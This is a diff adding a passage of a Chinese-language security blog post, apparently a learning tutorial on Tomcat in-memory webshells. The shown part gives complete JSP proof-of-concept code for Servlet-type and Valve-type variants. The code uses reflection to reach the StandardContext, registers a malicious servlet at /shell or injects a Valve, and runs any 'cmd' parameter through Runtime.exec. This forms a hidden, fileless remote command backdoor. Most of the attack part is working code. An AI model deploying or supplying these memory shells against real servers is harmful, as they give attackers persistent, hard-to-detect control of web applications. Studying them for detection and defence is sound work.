+                try {
+                    wrapper.load();
+                }
+</code></pre>
+<p>注意这里对于Wrapper对象中<code>loadOnStartup</code>属性的值进行判断，只有大于0的才会被放入list进行后续的<code>wrapper.load()</code>加载调用。</p>
+<p>这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过<code>loadOnStartup</code>属性值来设置每个Servlet的启动顺序。默认值为-1，所以是需要我们手动修改的</p>
+<p>总结一下需要完成哪些：</p>
+<pre><code class="language-java">获取StandardContext对象
+编写恶意Servlet
+通过StandardContext.createWrapper()创建StandardWrapper对象
+设置StandardWrapper对象的loadOnStartup属性值
+设置StandardWrapper对象的ServletName属性值
+设置StandardWrapper对象的ServletClass属性值
+将StandardWrapper对象添加进StandardContext对象的children属性中
+通过StandardContext.addServletMappingDecoded()添加对应的路径映射
+</code></pre>
+<p>获取StandardContext对象：</p>
+<pre><code class="language-java">&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+%&gt;
+</code></pre>
+<p>恶意类：</p>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%!
+    //jsp定义或者声明需要加上！
+    public class CmdServlet extends HttpServlet {
+        @Override
+        public void init(ServletConfig servletConfig){
+
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            if(cmd!=null){
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+
+        }
+    }
+%&gt;
+</code></pre>
+<p>创建StandardWrapper对象</p>
+<pre><code class="language-java">&lt;%
+    CmdServlet cmdServlet = new CmdServlet();
+    String name = cmdServlet.getClass().getSimpleName();
+ 
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setLoadOnStartup(1);
+    wrapper.setName(name);
+    wrapper.setServlet(cmdServlet);
+    wrapper.setServletClass(cmdServlet.getClass().getName());
+%&gt;
+</code></pre>
+<p>添加进上下文：</p>
+<pre><code class="language-java">&lt;%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);
+%&gt;
+</code></pre>
+<h3 id="poc-2">POC</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;
+&lt;%!
+    //jsp定义或者声明需要加上！
+    public class CmdServlet extends HttpServlet {
+        @Override
+        public void init(ServletConfig servletConfig){
+
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            if(cmd!=null){
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+
+        }
+    }
+%&gt;
+
+&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+%&gt;
+
+&lt;%
+    CmdServlet cmdServlet = new CmdServlet();
+    String name = cmdServlet.getClass().getSimpleName();
+
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setLoadOnStartup(1);
+    wrapper.setName(name);
+    wrapper.setServlet(cmdServlet);
+    wrapper.setServletClass(cmdServlet.getClass().getName());
+%&gt;
+
+&lt;%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);
+%&gt;
+</code></pre>
+<p>得先访问jsp文件 加载进去之后在对应的路径下执行命令</p>
+<figure data-type="image" tabindex="28"><img src="https://bloyet.github.io/post-images/1752213967096.png" alt="" loading="lazy"></figure>
+<h2 id="valve型">Valve型</h2>
+<p>先学习一下什么是Valve</p>
+<p>我们先来简单了解一下Tomcat中的<code>管道机制</code></p>
+<p>我们知道，当Tomcat接收到客户端请求时，首先会使用<code>Connector</code>进行解析，然后发送到<code>Container</code>进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。</p>
+<p>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制</p>
+<figure data-type="image" tabindex="29"><img src="https://bloyet.github.io/post-images/1752213967112.png" alt="" loading="lazy"></figure>
+<p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个<strong>StandardPipeline</strong>实例。</p>
+<h3 id="管道机制流程分析">管道机制流程分析</h3>
+<p>Pipeline接口：</p>
+<p>我们可以看到它是继承了Contained</p>
+<pre><code class="language-java">public interface Pipeline extends Contained {
+ 
+    public Valve getBasic();
+ 
+    public void setBasic(Valve valve);
+ 
+    public void addValve(Valve valve);
+ 
+    public Valve[] getValves();
+ 
+    public void removeValve(Valve valve);
+ 
+    public void findNonAsyncValves(Set&lt;String&gt; result);
+}
+</code></pre>
+<p>Pipeline接口提供了各种各样对Value操作的接口，例如我们等会需要用的的addValue</p>
+<p>Value接口：</p>
+<pre><code class="language-java">public interface Valve {
+ 
+    public Valve getNext();
+ 
+    public void setNext(Valve valve);
+ 
+    public void backgroundProcess();
+ 
+    public void invoke(Request request, Response response)
+        throws IOException, ServletException;
+ 
+    public boolean isAsyncSupported();
+}
+</code></pre>
+<p>其中getNext()方法可以用来获取下一个Valve，这个调用模式跟Filter的调用模式很像</p>
+<figure data-type="image" tabindex="30"><img src="https://bloyet.github.io/post-images/1752213967129.jpeg" alt="" loading="lazy"></figure>
+<p>通过源码看一看，消息在容器之间是如何传递的</p>
+<p>消息传递到Connector被解析后，在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中：</p>
+<pre><code class="language-java">public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
+    Request request = (Request) req.getNote(ADAPTER_NOTES);
+    Response response = (Response) res.getNote(ADAPTER_NOTES);
+
+    if (request == null) {
+        // Create objects
+        request = connector.createRequest();
+        request.setCoyoteRequest(req);
+        response = connector.createResponse();
+        response.setCoyoteResponse(res);
+
+        // Link objects
+        request.setResponse(response);
+        response.setRequest(request);
+
+        // Set as notes
+        req.setNote(ADAPTER_NOTES, request);
+        res.setNote(ADAPTER_NOTES, response);
+
+        // Set query string encoding
+        req.getParameters().setQueryStringCharset(connector.getURICharset());
+    }
+        ...
+
+    try {
+        ...
+        connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);
+    }
+        ...
+}
+</code></pre>
+<p>主要的就是看这个<strong>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</strong></p>
+<p>我们这里最好是通过断点来看，看的更清楚</p>
+<figure data-type="image" tabindex="31"><img src="https://bloyet.github.io/post-images/1752213967145.png" alt="" loading="lazy"></figure>
+<p>connector.getService()： 获得StandardService<br>
+<img src="https://bloyet.github.io/post-images/1752213967159.png" alt="" loading="lazy"></p>
+<p>接着通过StandardService.getContainer().getPipeline()获取StandardPipeline对象</p>
+<figure data-type="image" tabindex="32"><img src="https://bloyet.github.io/post-images/1752213967175.png" alt="" loading="lazy"></figure>
+<p>connector.getService().getContainer().getPipeline().getFirst() 获取到Valve</p>
+<figure data-type="image" tabindex="33"><img src="https://bloyet.github.io/post-images/1752213967191.png" alt="" loading="lazy"></figure>
+<p>然后就是通过invoke方法 来执行不同的方法了</p>
+<h3 id="注入valve">注入Valve</h3>
+<p>我们可以看到是通过getFirst()来获取到不同的Valve 然后在执行对应的操作，那么我们就只需要获取到网页的context，然后把我们恶意的Value存放进去，就可以达到攻击目的了</p>
+<p>我们看看在哪里存放了Valve ，找到Pipeline</p>
+<figure data-type="image" tabindex="34"><img src="https://bloyet.github.io/post-images/1752213967239.png" alt="" loading="lazy"></figure>
+<p>pipeline是在它的父类中定义的</p>
+<figure data-type="image" tabindex="35"><img src="https://bloyet.github.io/post-images/1752213967207.png" alt="" loading="lazy"></figure>
+<p>接着看</p>
+<figure data-type="image" tabindex="36"><img src="https://bloyet.github.io/post-images/1752213967223.png" alt="" loading="lazy"></figure>
+<p>可以通过addValve方法添加Valve</p>
+<p>那么现在思路就明确了：</p>
+<ol>
+<li>获取<code>StandardContext</code>对象</li>
+<li>通过<code>StandardContext</code>对象获取<code>StandardPipeline</code></li>
+<li>编写恶意Valve</li>
+<li>通过<code>StandardPipeline.addValve()</code>动态添加Valve</li>
+</ol>
+<p>获取StandardPipeline对象</p>
+<pre><code class="language-java">&lt;%
+Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+reqF.setAccessible(true);
+Request req = (Request) reqF.get(request);
+StandardContext standardContext = (StandardContext) req.getContext();
+
+Pipeline pipeline = standardContext.getPipeline();
+%&gt;
+</code></pre>
+<p>编写恶意Valve</p>
+<p>继承父类，并且重写invoke方法</p>
+<pre><code class="language-java">&lt;%!
+class Shell_Valve extends ValveBase {
+
+@Override
+public void invoke(Request request, Response response) throws IOException, ServletException {
+    String cmd = request.getParameter(&quot;cmd&quot;);
+    if (cmd !=null){
+        try{
+            Runtime.getRuntime().exec(cmd);
+        }catch (IOException e){
+            e.printStackTrace();
+        }catch (NullPointerException n){
+            n.printStackTrace();
+        }
+    }
+}
+}
+%&gt;
+</code></pre>
+<p>动态添加Valve</p>
+<pre><code class="language-java">&lt;%
+Shell_Valve shell_valve = new Shell_Valve();
+pipeline.addValve(shell_valve);
+%&gt;
+</code></pre>
+<h3 id="poc-3">POC</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Pipeline&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+
+&lt;%
+Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+reqF.setAccessible(true);
+Request req = (Request) reqF.get(request);
+StandardContext standardContext = (StandardContext) req.getContext();
+
+Pipeline pipeline = standardContext.getPipeline();
+%&gt;
+
+&lt;%!
+class Shell_Valve extends ValveBase {
+
+    @Override
+    public void invoke(Request request, Response response) throws IOException, ServletException {
+        String cmd = request.getParameter(&quot;cmd&quot;);
+        if (cmd !=null){
+            try{
+                Runtime.getRuntime().exec(cmd);
+            }catch (IOException e){
+                e.printStackTrace();
+            }catch (NullPointerException n){
+                n.printStackTrace();
+            }
+        }
+    }
+}
+%&gt;
+
+&lt;%
+Shell_Valve shell_valve = new Shell_Valve();
+pipeline.addValve(shell_valve);
+%&gt;
+</code></pre>
+<p>访问jsp文件后 动态注入内存马 任意路径可以执行命令</p>
+<figure data-type="image" tabindex="37"><img src="https://bloyet.github.io/post-images/1752213967255.png" alt="" loading="lazy"></figure>
+<h1 id="总结">总结</h1>
+<p>其实Tomcat内存马学起来也不算太难，别给自己设置难度（这里是因为作者的开发功底不太好，很多基础的东西并没有去学过，所以一直在拖延吧，得好好反思），java的学习是需要沉下心来学习的 加油</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#tomcat%E4%B8%AD%E7%9A%84%E4%B8%89%E7%A7%8Dcontext">Tomcat中的三种Context</a>
+<ul>
+<li><a href="#servletcontext">ServletContext</a></li>
+<li><a href="#applicationcontext">ApplicationContext</a></li>
+<li><a href="#standardcontext">StandardContext</a></li>
+</ul>
+</li>
+<li><a href="#tomcat%E5%86%85%E5%AD%98%E9%A9%AC">Tomcat内存马</a>
+<ul>
+<li><a href="#listener%E5%9E%8B">Listener型</a>
+<ul>
+<li><a href="#listener%E6%B3%A8%E5%86%8C%E8%BF%87%E7%A8%8B">Listener注册过程</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5listener">注入Listener</a></li>
+</ul>
+</li>
+<li><a href="#filter%E5%9E%8B">Filter型</a>
+<ul>
+<li><a href="#filter%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90">Filter调用分析</a></li>
+<li><a href="#filter%E6%B3%A8%E5%86%8C%E5%88%86%E6%9E%90">Filter注册分析</a>
+<ul>
+<li><a href="#standardcontext-2">StandardContext</a></li>
+<li><a href="#filterconfigs">filterConfigs：</a></li>
+<li><a href="#filterdef">filterDef：</a></li>
+<li><a href="#filterdefs">filterDefs</a></li>
+<li><a href="#filtermaps">filterMaps</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B3%A8%E5%86%8Cfilter%E6%80%9D%E8%B7%AF">注册Filter思路</a>
+<ul>
+<li><a href="#%E8%8E%B7%E5%8F%96standardcontext%E5%AF%B9%E8%B1%A1">获取StandardContext对象</a></li>
+<li><a href="#1-%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8Ffilter">1. 创建恶意Filter</a></li>
+<li><a href="#filterdef%E5%AF%B9filter%E8%BF%9B%E8%A1%8C%E5%B0%81%E8%A3%85">FilterDef对Filter进行封装</a></li>
+<li><a href="#%E5%88%9B%E5%BB%BAfiltermap%E7%B1%BB">创建filterMap类</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5%E5%88%B0filterconfigs%E4%B8%AD">注入到filterConfigs中</a></li>
+</ul>
+</li>
+<li><a href="#poc">POC</a></li>
+</ul>
+</li>
+<li><a href="#servlet%E5%9E%8B">Servlet型</a>
+<ul>
+<li><a href="#%E7%BC%96%E5%86%99%E6%81%B6%E6%84%8Fservlet">编写恶意servlet</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5servlet%E5%86%85%E5%AD%98%E9%A9%AC">注入servlet内存马</a>
+<ul>
+<li><a href="#%E5%88%9B%E5%BB%BAstandardwrapper">创建StandardWrapper</a></li>
+<li><a href="#%E5%8A%A0%E8%BD%BDstandwrapper">加载StandWrapper</a></li>
+</ul>
+</li>
+<li><a href="#poc-2">POC</a></li>
+</ul>
+</li>
+<li><a href="#valve%E5%9E%8B">Valve型</a>
+<ul>
+<li><a href="#%E7%AE%A1%E9%81%93%E6%9C%BA%E5%88%B6%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">管道机制流程分析</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5valve">注入Valve</a></li>
+<li><a href="#poc-3">POC</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://bloyet.github.io/post/log4j2-fan-xu-lie-hua/">
+              <h3 class="post-title">
+                Log4j2反序列化
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://bloyet.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
